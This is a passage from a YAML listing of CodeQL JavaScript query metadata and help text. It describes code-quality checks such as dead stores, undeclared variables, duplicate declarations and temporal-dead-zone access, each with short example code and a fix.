      \ a typo or a logic error.\n\n\n## Recommendation\nEnsure that the name of the\
      \ variable has not been misspelled. If the assignment refers to an externally\
      \ defined global variable (such as property of the `window` object), you can provide\
      \ an externs file or a JSLint-style `/*global ...*/` directive to inform the analysis\
      \ about this variable.\n\n\n## Example\nThe following example shows a function\
      \ for counting the number of leaves in a binary tree. For an inner node, the function\
      \ first recursively counts the number of leaves in the left and right subtrees,\
      \ stores them in variables, and then returns their sum. The name of the variable\
      \ holding the number of leaves in the right subtree has been misspelled: it is\
      \ spelled `rigtLeaves` instead of `rightLeaves`.\n\nSince undeclared variables\
      \ in JavaScript are assumed to be global by default, this assignment stores the\
      \ number of leaves in the right subtree in a global variable `rigtLeaves`, so\
      \ the algorithm will not work as expected.\n\n\n```javascript\nfunction countLeaves(nd)\
      \ {\n\tvar leftLeaves, rightLeaves;\n\t\n\tif (nd.isLeaf)\n\t\treturn 1;\n\t\n\
      \tleftLeaves = countLeaves(nd.left);\n\trigtLeaves = countLeaves(nd.right);\n\t\
      return leftLeaves + rightLeaves;\n}\n```\nTo fix this, correct the name of the\
      \ local variable:\n\n\n```javascript\nfunction countLeaves(nd) {\n\tvar leftLeaves,\
      \ rightLeaves;\n\t\n\tif (nd.isLeaf)\n\t\treturn 1;\n\t\n\tleftLeaves = countLeaves(nd.left);\n\
      \trightLeaves = countLeaves(nd.right);\n\treturn leftLeaves + rightLeaves;\n}\n\
      ```\n\n## References\n* D. Crockford, *JavaScript: The Good Parts*, Appendix A.\
      \ O'Reilly, 2008.\n* Google Closure Tools: [Declaring externs](https://developers.google.com/closure/compiler/docs/api-tutorial3?csw=1#externs).\n\
      * JSLint: [Global Variables](http://www.jslint.com/help.html#global).\n* Common\
      \ Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/DeadStoreOfLocal.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/DeadStoreOfLocal.bqrs
    metadata:
      name: Useless assignment to local variable
      description: |-
        An assignment to a local variable that is not used later on, or whose value is always
                      overwritten, has no effect.
      kind: problem
      problem.severity: warning
      id: js/useless-assignment-to-local
      tags: |-
        quality
               maintainability
               useless-code
               external/cwe/cwe-563
      precision: very-high
    queryHelp:
      "# Useless assignment to local variable\nA value is assigned to a variable\
      \ or property, but either that location is never read later on, or its value is\
      \ always overwritten before being read. This means that the original assignment\
      \ has no effect, and could indicate a logic error or incomplete code.\n\n\n##\
      \ Recommendation\nEnsure that you check the control and data flow in the method\
      \ carefully. If a value is really not needed, consider omitting the assignment.\
      \ Be careful, though: if the right-hand side has a side-effect (like performing\
      \ a method call), it is important to keep this to preserve the overall behavior.\n\
      \n\n## Example\nIn the following example, the return value of the call to `send`\
      \ on line 2 is assigned to the local variable `result`, but then never used.\n\
      \n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\twaitForResponse();\n\
      \treturn getResponse();\n}\n```\nAssuming that `send` returns a status code indicating\
      \ whether the operation succeeded or not, the value of `result` should be checked,\
      \ perhaps like this:\n\n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\
      \t// check for error\n\tif (result === -1)\n\t\tthrow new Error(\"send failed\"\
      );\n\twaitForResponse();\n\treturn getResponse();\n}\n```\n\n## References\n*\
      \ Wikipedia: [Dead store](http://en.wikipedia.org/wiki/Dead_store).\n* Common\
      \ Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/DeadStoreOfProperty.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/DeadStoreOfProperty.bqrs
    metadata:
      name: Useless assignment to property
      description:
        An assignment to a property whose value is always overwritten has
        no effect.
      kind: problem
      problem.severity: warning
      id: js/useless-assignment-to-property
      tags: |-
        quality
               maintainability
               useless-code
      precision: high
    queryHelp:
      "# Useless assignment to property\nA value is assigned to a variable\
      \ or property, but either that location is never read later on, or its value is\
      \ always overwritten before being read. This means that the original assignment\
      \ has no effect, and could indicate a logic error or incomplete code.\n\n\n##\
      \ Recommendation\nEnsure that you check the control and data flow in the method\
      \ carefully. If a value is really not needed, consider omitting the assignment.\
      \ Be careful, though: if the right-hand side has a side-effect (like performing\
      \ a method call), it is important to keep this to preserve the overall behavior.\n\
      \n\n## Example\nIn the following example, the return value of the call to `send`\
      \ on line 2 is assigned to the local variable `result`, but then never used.\n\
      \n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\twaitForResponse();\n\
      \treturn getResponse();\n}\n```\nAssuming that `send` returns a status code indicating\
      \ whether the operation succeeded or not, the value of `result` should be checked,\
      \ perhaps like this:\n\n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\
      \t// check for error\n\tif (result === -1)\n\t\tthrow new Error(\"send failed\"\
      );\n\twaitForResponse();\n\treturn getResponse();\n}\n```\n\n## References\n*\
      \ Wikipedia: [Dead store](http://en.wikipedia.org/wiki/Dead_store).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/DeclBeforeUse.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/DeclBeforeUse.bqrs
    metadata:
      name: Variable not declared before use
      description: Variables should be declared before their first use.
      kind: problem
      problem.severity: warning
      id: js/use-before-declaration
      tags: |-
        quality
               maintainability
               readability
      precision: very-high
    queryHelp:
      "# Variable not declared before use\nJavaScript allows local variables\
      \ to be used before they are declared. However, this is confusing for readers\
      \ of the code, since it may not be clear whether the use refers to the local variable\
      \ or to a global variable of the same name.\n\n\n## Recommendation\nMove local\
      \ variable declarations to the beginning of the enclosing function, or (for global\
      \ variables) to the beginning of the source file.\n\n\n## Example\nIn the following\
      \ example, the local variable `x` declared in function `f` shadows the global\
      \ variable of the same name. However, the first use of the local variable precedes\
      \ its declaration, so a developer unfamiliar with the code might assume that this\
      \ use refers to the global variable instead of the local variable.\n\n\n```javascript\n\
      var x = 23;\n\nfunction f() {\n\tx = 42;\n\tvar x;\n}\n```\n\n## References\n\
      * D. Crockford, *JavaScript: The Good Parts*, Section 4.9. O'Reilly, 2008.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/DefaultArgumentReferencesNestedFunction.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/DefaultArgumentReferencesNestedFunction.bqrs
    metadata:
      name: Default parameter references nested function
      description: |-
        If a default parameter value references a function that is nested inside the
                      function to which the parameter belongs, a runtime error will occur, since
                      the function is not yet defined at the point where it is referenced.
      kind: problem
      problem.severity: error
      id: js/nested-function-reference-in-default-parameter
      tags: |-
        quality
               reliability
               correctness
      precision: very-high
    queryHelp: |
      # Default parameter references nested function
      Default parameter values can only refer to variables and functions that are defined before the parameter. In particular, they cannot refer to nested functions defined inside the function body, since their definition is not evaluated until after default parameter values have been computed.


      ## Recommendation
      Move the function into the enclosing scope so that it becomes available to the default parameter.


      ## Example
      In the following example, the default parameter value for the parameter `y` of the function `f` is computed from the value of the parameter `x` using the function `defaultVal`. However, since `defaultVal` is defined inside `f` itself, it is not yet defined at the point where the default value of `y` is evaluated, which will lead to a runtime error.


      ```javascript
      function f(x, y = defaultVal(x)) {
          function defaultVal(x) {
              return x+19;
          }
          return x*y;
      }

      ```
      To fix this problem, `defaultVal` should be moved into the outer scope so that it becomes available to `y`:


      ```javascript
      function defaultVal(x) {
          return x+19;
      }

      function f(x, y = defaultVal(x)) {
          return x*y;
      }

      ```

      ## References
      * Mozilla Developer Network: [Default parameters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Default_parameters).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/DuplicateVarDecl.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/DuplicateVarDecl.bqrs
    metadata:
      name: Duplicate variable declaration
      description: |-
        A variable declaration statement that declares the same variable twice is
                      confusing and hard to maintain.
      kind: problem
      problem.severity: recommendation
      id: js/duplicate-variable-declaration
      tags: |-
        quality
               maintainability
               readability
      precision: very-high
    queryHelp: |
      # Duplicate variable declaration
      A variable declaration statement that declares the same variable twice is confusing and hard to maintain.


      ## Recommendation
      Remove one of the two declarations. When removing a declaration with an initializer, further changes may be necessary to ensure that the variable is correctly initialized.


      ## Example
      In the following example, the variable declaration statement declares the variable `dom` twice. The second declaration is unnecessary, and since it has no initializer it can simply be removed.


      ```javascript
      var dom,
          contactDetails,
          phonesTemplate,
          emailsTemplate,
          dom;

      ```

      ## References
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 12.2. ECMA, 2011.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/IneffectiveParameterType.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/IneffectiveParameterType.bqrs
    metadata:
      name: Ineffective parameter type
      description:
        Omitting the name of a parameter causes its type annotation to be
        parsed as the name.
      kind: problem
      problem.severity: warning
      id: js/ineffective-parameter-type
      precision: high
      tags: |-
        quality
               reliability
               correctness
               typescript
    queryHelp: |
      # Ineffective parameter type
      In TypeScript, the parameters of a function signature must have a name and may optionally have a type. A common mistake is to try to omit the name. This means the type is instead seen as the name. As a result, the parameter type will default to `any` since no type was given.

      Parameter names in function signatures are only relevant for documentation purposes but cannot be omitted.


      ## Recommendation
      Give both a name and type to the parameter, as it cannot be given a type without having a name. Alternatively, if the parameter is intentionally untyped, change its name so it does not coincide with a type name.


      ## Example
      In the following example, the callback parameter is written as `(T) => string`, which actually means `(T: any) => string` and is not useful for type checking or code completion.


      ```javascript
      function join<T>(items: T[], callback: (T) => string) {
        return items.map(callback).join(", ")
      }

      ```
      Amend this by changing the callback type to `(item: T) => string`. The parameter name `item` is only relevant for documentation purposes, but a name is required regardless.


      ```javascript
      function join<T>(items: T[], callback: (item: T) => string) {
        return items.map(callback).join(", ")
      }

      ```
      Untyped parameters are illegal when compiling with the TypeScript flag `--noImplicitAny`.


      ## References
      * [TypeScript Handbook, Functions](https://www.typescriptlang.org/docs/handbook/functions.html)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/MissingThisQualifier.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/MissingThisQualifier.bqrs
    metadata:
      name: Missing 'this' qualifier
      description:
        Referencing an undeclared global variable in a class that has a member
        of the same name is confusing and may indicate a bug.
      kind: problem
      problem.severity: error
      id: js/missing-this-qualifier
      tags: |-
        quality
               reliability
               correctness
               methods
      precision: high
    queryHelp:
      "# Missing 'this' qualifier\nJavaScript methods can call other methods\
      \ of the same class instance through the use of the `this` keyword. In other object-oriented\
      \ languages such as Java, the use of the `this` keyword for such method calls\
      \ is optional. It is however *not* optional in JavaScript. If the `this` keyword\
      \ is left out, the call is a regular function call.\n\n\n## Recommendation\nAdd\
      \ the `this` keyword as the receiver of the call.\n\n\n## Example\nIn the following\
      \ example, the call to `setAudioProperties` will call an undeclared global function,\
      \ and *not* the method defined later in the class.\n\n\n```javascript\nclass Audio3D\
      \ {\n  setAudioStream(){\n    // ...\n    setAudioProperties();\n    // ...\n\
      \  }\n\n  setAudioProperties(){\n    // ...  \n  }\n}\n```\nThe problem can be\
      \ fixed by adding the `this` keyword to the call: `this.setAudioProperties()`.\n\
      \n\n## References\n* MDN: [Classes](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes)\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/MissingVarDecl.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/MissingVarDecl.bqrs
    metadata:
      name: Missing variable declaration
      description: |-
        If a variable is not declared as a local variable, it becomes a global variable
                      by default, which may be unintentional and could lead to unexpected behavior.
      kind: problem
      problem.severity: warning
      id: js/missing-variable-declaration
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp:
      "# Missing variable declaration\nIn JavaScript, if a variable is used\
      \ in a function but not declared as a local variable, it becomes a global variable\
      \ by default. This can have unintended consequences: unlike local variables, global\
      \ variables can be read and modified by all functions. If different functions\
      \ use the same global variable, they may end up overwriting each others values,\
      \ leading to subtle and difficult to diagnose bugs.\n\n\n## Recommendation\nCheck\
      \ whether the variable in question was meant to be local; if so, declare it by\
      \ means of a `var` declaration. If the variable is really meant to be global,\
      \ it is best to document this fact by inserting a global `var` declaration at\
      \ the beginning of the source file.\n\n\n## Example\nIn the following example,\
      \ both `f` and `g` use a loop counter variable `i`. Since neither of them declares\
      \ `i` to be a local variable, they end up accessing the same global variable,\
      \ so every time `f` invokes `g` inside the loop, `g` overwrites `f`'s value for\
      \ `i`.\n\n\n```javascript\nfunction f(a) {\n\tvar sum = 0;\n\tfor (i=0; i<a.length;\
      \ ++i)\n\t\tsum += g(a[i]);\n\treturn sum;\n}\n\nfunction g(b) {\n\tvar prod =\
      \ 1;\n\tfor (i=0; i<b.length; ++i)\n\t\tprod *= b[i];\n\treturn prod;\n}\n```\n\
      The example should be fixed by declaring `i` to be a local variable in `f` and\
      \ `g`.\n\n\n## References\n* D. Crockford, *JavaScript: The Good Parts*, Appendix\
      \ A. O'Reilly, 2008.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/MixedStaticInstanceThisAccess.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/MixedStaticInstanceThisAccess.bqrs
    metadata:
      name: Wrong use of 'this' for static method
      description:
        "A reference to a static method from within an instance method needs\
        \ to be qualified with the class name, not `this`."
      kind: problem
      problem.severity: error
      id: js/mixed-static-instance-this-access
      tags: |-
        quality
               reliability
               correctness
               methods
      precision: high
    queryHelp: |
      # Wrong use of 'this' for static method
      A method of a class can be either a static method or an instance method. For a static method, the value of `this` is the enclosing class. For an instance method, the value of `this` is the object instance itself. It is therefore not possible to refer to a static method from an instance method using `this`, and vice versa.


      ## Recommendation
      A reference to an instance method from within a static method needs to be qualified with an instance of the class, and not `this`.


      ## Example
      In the following code snippet, the `bar` method is an instance method and it attempts to use the static `baz` method through `this`. That is not possible, so the call will fail at runtime.


      ```javascript
      class Foo {
          bar(){
              this.baz(42);
          }
          static baz(x){
              // ...
          }
      }

      ```
      The code should be changed to use the enclosing class instead of `this`: `Foo.baz(42)`.


      ## References
      * Mozilla Developer Network: [Classes and static methods](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/static).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/RedeclaredVariable.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/RedeclaredVariable.bqrs
    metadata:
      name: Redeclared variable
      description:
        Declaring the same variable twice is confusing and may even suggest
        a latent bug.
      kind: problem
      problem.severity: recommendation
      id: js/variable-redeclaration
      tags: |-
        reliability
               readability
      precision: medium
    queryHelp:
      "# Redeclared variable\nLocal variables in JavaScript are function-scoped\
      \ (unlike, for instance, in Java, which uses block scope), and can be redeclared\
      \ an arbitrary number of times. If a variable is declared twice in different blocks,\
      \ however, this can confuse readers, since the declarations look like they refer\
      \ to different variables.\n\n\n## Recommendation\nIf the two declarations logically\
      \ refer to the same variable, replace them with a single declaration at the beginning\
      \ of the block. If they do not, rename one of the variables to distinguish it\
      \ from the other.\n\n\n## Example\nIn the following code snippet, both declarations\
      \ for `value` declare the same local variable, although their uses are independent.\n\
      \n\n```javascript\nfunction f(x) {\n\tswitch (x.type) {\n\tcase 'String':\n\t\t\
      var value = x.value;\n\t\treturn +value.trim();\n\tcase 'Integer':\n\t\tvar value\
      \ = x.value;\n\t\treturn value%2;\n\t}\n}\n```\n\n## References\n* D. Crockford,\
      \ *JavaScript: The Good Parts*, Section 4.9. O'Reilly, 2008.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/SuspiciousMethodNameDeclaration.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/SuspiciousMethodNameDeclaration.bqrs
    metadata:
      name: Suspicious method name declaration
      description: |-
        A method declaration with a name that is a special keyword in another
                      context is suspicious.
      kind: problem
      problem.severity: warning
      id: js/suspicious-method-name-declaration
      precision: high
      tags: |-
        quality
               reliability
               correctness
               typescript
               methods
    queryHelp: |
      # Suspicious method name declaration
      In TypeScript, certain keywords have special meanings for member declarations, and misusing them can create confusion:

      * In classes, use `constructor` rather than `new` to declare constructors. Using `new` within a class creates a method named "new" and not a constructor signature.
      * In interfaces, use `new` rather than `constructor` to declare constructor signatures. Using `constructor` within an interface creates a method named "constructor" and not a constructor signature.
      * Similarly, the keyword `function` is used to declare functions in some contexts. However, using the name `function` for a class or interface member declaration declares a method named "function".
      When these keywords are misused, TypeScript will interpret them as regular method names rather than their intended special syntax, leading to code that may not work as expected.


      ## Recommendation
      Consider following these guidelines for clearer code:

      * For classes, use `constructor` to declare constructors.
      * For interfaces, use `new` to declare constructor signatures (call signatures that create new instances).
      * Avoid accidentally creating methods named `function` by misusing the `function` keyword within class or interface declarations.

      ## Example
      The following examples show common mistakes when using these keywords:

      This interface mistakenly uses `constructor`, which creates a method named "constructor" instead of a constructor signature:


      ```javascript
      // BAD: Using 'constructor' in an interface creates a method, not a constructor signature
      interface Point {
         x: number;
         y: number;
         constructor(x: number, y: number); // This is just a method named "constructor"
      }

      ```
      Use `new` for constructor signatures in interfaces:


      ```javascript
      // GOOD: Using 'new' for constructor signatures in interfaces
      interface Point {
         x: number;
         y: number;
         new(x: number, y: number): Point; // This is a proper constructor signature
      }

      ```
      This class mistakenly uses `new`, which creates a method named "new" instead of a constructor:


      ```javascript
      // BAD: Using 'new' in a class creates a method, not a constructor
      class Point {
         x: number;
         y: number;
         new(x: number, y: number) {}; // This is just a method named "new"
      }

      ```
      Use `constructor` for constructors in classes:


      ```javascript
      // GOOD: Using 'constructor' for constructors in classes
      class Point {
         x: number;
         y: number;
         constructor(x: number, y: number) { // This is a proper constructor
            this.x = x;
            this.y = y;
         }
      }

      ```
      This interface uses `function` as a method name, which declares a method named "function" rather than declaring a function:


      ```javascript
      // BAD: Using 'function' as a method name is confusing
      interface Calculator {
         function(a: number, b: number): number; // This is just a method named "function"
      }

      ```
      Use a descriptive method name instead:


      ```javascript
      // GOOD: Using descriptive method names instead of 'function'
      interface Calculator {
         calculate(a: number, b: number): number; // Clear, descriptive method name
      }

      ```

      ## References
      * TypeScript Handbook: [Classes - Constructors](https://www.typescriptlang.org/docs/handbook/2/classes.html#constructors).
      * TypeScript specification: [Constructor Type Literals](https://github.com/microsoft/TypeScript/blob/30cb20434a6b117e007a4959b2a7c16489f86069/doc/spec-ARCHIVED.md#3.8.9).
      * TypeScript specification: [Constructor Parameters](https://github.com/microsoft/TypeScript/blob/30cb20434a6b117e007a4959b2a7c16489f86069/doc/spec-ARCHIVED.md#8.3.1).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/TemporalDeadZone.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/TemporalDeadZone.bqrs
    metadata:
      name: Access to let-bound variable in temporal dead zone
      description: |-
        Accessing a let-bound variable before its declaration will lead to a runtime
                      error on ECMAScript 2015-compatible platforms.
      kind: problem
      problem.severity: error
      id: js/variable-use-in-temporal-dead-zone
      tags: |-
        quality
               reliability
               correctness
               portability
      precision: very-high
    queryHelp: |
      # Access to let-bound variable in temporal dead zone
      The scope of a variable declared with `let` is its innermost enclosing block statement, loop or function. Unlike variables declared with `var`, variables declared with `let` are not hoisted to the top of their scope, giving rise to a region of code where the variable is in scope, but not declared yet. Accessing a `let`-bound variable inside this so-called "temporal dead zone" is permitted by some legacy implementations, but is illegal in ECMAScript 2015.


      ## Recommendation
      Move the `let` declaration to the beginning of its scope.


      ## Example
      In the following example, `x` is initialized before its declaration:


      ```javascript
      function f() {
          x = 23;
          let x;
      }

      ```
      The declaration should be moved as follows:


      ```javascript
      function f() {
          let x;
          x = 23;
      }

      ```

      ## References
      * Mozilla Developer Network: [Temporal dead zone and errors with let](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#Temporal_dead_zone_and_errors_with_let).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/TooManyParameters.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/TooManyParameters.bqrs
    metadata:
      name: Function with too many parameters
      description: Functions with many parameters are hard to read and hard to use.
      kind: problem
      problem.severity: recommendation
      id: js/too-many-parameters
      tags: |-
        testability
               readability
      precision: low
    queryHelp:
      "# Function with too many parameters\nFunctions with many parameters\
      \ are hard to understand and to use, and should be avoided.\n\n\n## Recommendation\n\
      In some cases it may be possible to split the function into multiple smaller functions,\
      \ each of which only requires a subset of parameters. Where this is not possible,\
      \ consider passing the parameters as an object literal and accessing them as properties\
      \ of that literal.\n\n\n## Example\nIn the following example, function `sendRecord`\
      \ has nine parameters. Such a function is hard to use, since the user has to remember\
      \ in which order to pass the arguments.\n\n\n```javascript\nfunction sendRecord(firstName,\
      \ lastName, dateOfBirth, streetAddress, postCode, city, country, email, website)\
      \ {\n\tsendResponse({\n\t\tname: lastName + ', ' + firstName,\n\t\tDOB: dateOfBirth,\n\
      \t\taddress: streetAddress + '\\n' + postCode + ' ' + city + '\\n' + country,\n\
      \t\temail: email,\n\t\turl: website\n\t});\n}\n```\nThe function should be refactored\
      \ to use a parameter object instead, with each parameter of the old function corresponding\
      \ to a property of the object as in the following code. Of course, any calls to\
      \ the function have to be updated accordingly.\n\n\n```javascript\nfunction sendRecord(record)\
      \ {\n\tsendResponse({\n\t\tname: record.lastName + ', ' + record.firstName,\n\t\
      \tDOB: record.dateOfBirth,\n\t\taddress: record.streetAddress + '\\n'\n\t\t  \
      \     + record.postCode + ' ' + record.city + '\\n'\n\t\t       + record.country,\n\
      \t\temail: record.email,\n\t\turl: record.website\n\t});\n}\n```\n\n## References\n\
      * Cunningham &amp; Cunningham, Inc: [Code Smell: Too Many Parameters](http://c2.com/cgi/wiki?TooManyParameters).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/UniqueParameterNames.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/UniqueParameterNames.bqrs
    metadata:
      name: Duplicate parameter names
      description: |-
        If a function has two parameters with the same name, the second parameter
                      shadows the first one, which makes the code hard to understand and error-prone.
      kind: problem
      problem.severity: error
      id: js/duplicate-parameter-name
      tags: |-
        quality
               reliability
               correctness
      precision: very-high
    queryHelp:
      "# Duplicate parameter names\nIn non-strict mode, JavaScript allows a\
      \ function to have several parameters with the same name, where later parameters\
      \ shadow earlier parameters. This is an error-prone feature which makes code hard\
      \ to understand and should be avoided.\n\n\n## Recommendation\nRename the parameters\
      \ to have different names.\n\n\n## Example\nIn the following example, function\
      \ `f` has two parameters named `x`, the second one presumably being a typo for\
      \ `y`. Since no parameter `y` is declared, the use of `y` in the body of `f` refers\
      \ to a global variable of that name, if it exists.\n\n\n```javascript\nfunction\
      \ f(x, x) {\n\treturn x+y;\n}\n```\nDuplicate parameter names are illegal in strict\
      \ mode.\n\n\n## References\n* Ecma International, *ECMAScript Language Definition*,\
      \ 5.1 Edition, Annex C. ECMA, 2011.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/UniquePropertyNames.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/UniquePropertyNames.bqrs
    metadata:
      name: Overwritten property
      description: |-
        If an object literal has two properties with the same name,
                      the second property overwrites the first one,
                      which makes the code hard to understand and error-prone.
      kind: problem
      problem.severity: error
      id: js/overwritten-property
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-563
      precision: very-high
    queryHelp:
      "# Overwritten property\nIn ECMAScript 2015 and above, as well as ECMAScript\
      \ 5 non-strict mode, an object literal may define the same property multiple times,\
      \ with later definitions overwriting earlier ones. In particular, if the last\
      \ definition assigns a different value from earlier definitions, the earlier value\
      \ is lost, which is most likely unintentional and should be avoided.\n\n\n## Recommendation\n\
      Rename the properties to have different names.\n\n\n## Example\nIn the following\
      \ example, the object literal assigned to `point` has two definitions of property\
      \ `x`. The object's use in function `dist` suggests that the second definition\
      \ should define a property `y` instead, and should be renamed.\n\n\n```javascript\n\
      function dist(p) {\n\treturn Math.sqrt(p.x*p.x+p.y*p.y);\n}\n\nvar point = {\n\
      \tx: 3,\n\tx: 4\n};\nconsole.log(dist(point));\n```\n\n## References\n* Ecma International,\
      \ *ECMAScript Language Definition*, 5.1 Edition, Annex C. ECMA, 2011.\n* Ecma\
      \ International, *ECMAScript Language Definition*, 6th Edition, Annex E. ECMA,\
      \ 2015.\n* Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/UnreachableMethodOverloads.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/UnreachableMethodOverloads.bqrs
    metadata:
      name: Unreachable method overloads
      description: |-
        Having multiple overloads with the same parameter types in TypeScript
                      makes all overloads except the first one unreachable, as the compiler
                      always resolves calls to the textually first matching overload.
      kind: problem
      problem.severity: warning
      id: js/unreachable-method-overloads
      precision: high
      tags: |-
        quality
               reliability
               correctness
               typescript
    queryHelp: |
      # Unreachable method overloads
      The TypeScript compiler has to choose which specific overload is called when a method with multiple overloads is called. The compiler will always choose the textually first overload that does not give rise to any type errors with the arguments provided at the function call.

      This behavior can be unintuitive for programmers unfamiliar with the type system in TypeScript, and can in some instances lead to situations where a programmer writes an overloaded method where only the first overload can ever be used.


      ## Recommendation
      Either reorder the method overloads if an overload with more type parameters is placed before a similar overload with fewer parameters. Alternatively, collapse multiple overloads with identical parameter types by creating a single overload that returns a union of the return types from the multiple overloads.


      ## Example
      In the example below, a programmer has tried to express that a method can return multiple possible values by creating multiple overloads with identical parameter types. However, only the first overload will ever be selected by the TypeScript compiler.


      ```javascript
      interface Foo {
          getParsedThing(id: string): string[];
          getParsedThing(id: string): number[];
          getParsedThing(id: string): object[];
      }
      ```
      The error can be fixed by merging the overloads into a single method signature that returns a union of the previous return types.


      ```javascript
      interface Foo {
          getParsedThing(id: string): object[] | number[] | string[];
      }
      ```
      In the example below, an interface `Foo` declares a method `create()` with two overloads. The only difference between the two overloads is the type parameter `T` in the first overload. The TypeScript compiler will always use the first overload when `create()` is called, as a default type will be used for the type parameter `T` if none is provided. This default type is `unknown` in TypeScript 3.5+, and `{}` in earlier versions.


      ```javascript
      interface Foo {
          create<T>(a: string): MyObject<T>;
          create(a: string): MyObject<any>;
      }
      ```
      In this example, the error has been fixed by switching the order of the two overloads. In this fixed version, if the `create()` method is called with an explicit type argument the second overload will be used, as the first overload would give rise to a type error.


      ```javascript
      interface Foo {
          create(a: string): Array<any>;
          create<T>(a: string): Array<T>;
      }
      ```

      ## References
      * TypeScript specification: [Overload Resolution](https://github.com/microsoft/TypeScript/blob/30cb20434a6b117e007a4959b2a7c16489f86069/doc/spec-ARCHIVED.md#4.15.1)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/UnstableCyclicImport.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/UnstableCyclicImport.bqrs
    metadata:
      name: Unstable cyclic import
      description: |-
        If the top-level of a module accesses a variable from a cyclic import, its value depends on
                      which module is globally imported first.
      kind: problem
      problem.severity: warning
      id: js/unstable-cyclic-import
      tags: maintainability
      precision: low
    queryHelp: |
      # Unstable cyclic import
      The ECMAScript module system allows modules to cyclically depend on each other. However, modules must still be initialized one at a time. Normally, a module is initialized after its imported modules, but in the case of cyclic imports, this is not possible. This means that some modules in a cycle must be initialized before all of its imported modules are ready to be used.

      When the top-level code of a library depends on a value obtained from a cyclic import, its behavior thus depends on the initialization order. This order is determined by which module is first imported from the main module. Simply adding, removing, or reordering `import` statements can therefore cause the cyclic modules to stop working.

      Note that imports that are only used for type annotations in TypeScript files are removed at compile time. Such imports can therefore safely be used in a cycle.


      ## Recommendation
      Cyclic dependencies can be hard to break. There are several approaches that may help:

      * Split up the module so that the shared code is separated from the code that depends on the imported value.
      * Avoid using the imported value at the top-level, for example, by lazily initializing the variables that depend on it.
      * Ensure there are no other importers of the module whose value is used at the top-level. This ensures that the imported module has been initialized.
      * Merge two of the modules into a single module.

      ## Example
      In the example below, `services.js` and `audio.js` both depend on each other. As long as `services.js` is imported first, the code works as expected, but if `audio.js` is imported first, the list of services will contain `undefined` instead of the `AudioService` class.


      ```javascript
      // services.js
      import { AudioService } from './audio'
      import { StoreService } from './store';

      export const services = [
        AudioService,
        StoreService
      ];

      export function registerService(service) {
        /* ... */
      }

      // audio.js
      import { registerService } from './services';

      export class AudioService {
        static create() {
          registerService(new AudioService());
        }
      }

      ```
      One solution is to factor out the `registerService` function into another module which `AudioService` can safely depend on. The `services` module can use a re-export to maintain its original interface:


      ```javascript
      // service_base.js
      export function registerService(service) {
        /* ... */
      }

      // services.js
      import { AudioService } from './audio'
      import { StoreService } from './store';

      export { registerService } from './service_base'

      export const services = [
        AudioService,
        StoreService
      ];

      // audio.js
      import { registerService } from './service_base';

      export class AudioService {
        static create() {
          registerService(new AudioService());
        }
      }

      ```

      ## References
      * Mozilla Developer Network: [Import statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/UnusedParameter.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/UnusedParameter.bqrs
    metadata:
      name: Unused parameter
      description:
        "Unused parameters make functions hard to read and hard to use, and\
        \ should be removed."
      kind: problem
      problem.severity: recommendation
      id: js/unused-parameter
      tags: maintainability
      precision: medium
    queryHelp:
      "# Unused parameter\nUnused function parameters make code harder to maintain\
      \ and use. Clients that are unaware that the parameter is unused may perform nontrivial\
      \ computations to compute a value that is ultimately unused. Even if the parameter\
      \ is known to be unused, passing in default values such as `null` or `undefined`\
      \ makes the code hard to read.\n\n\n## Recommendation\nRemove the unused parameter\
      \ and adjust calls accordingly.\n\n\n## Example\nIn this code, the function `f`\
      \ does not use its second argument `y`, instead computing it from the first argument\
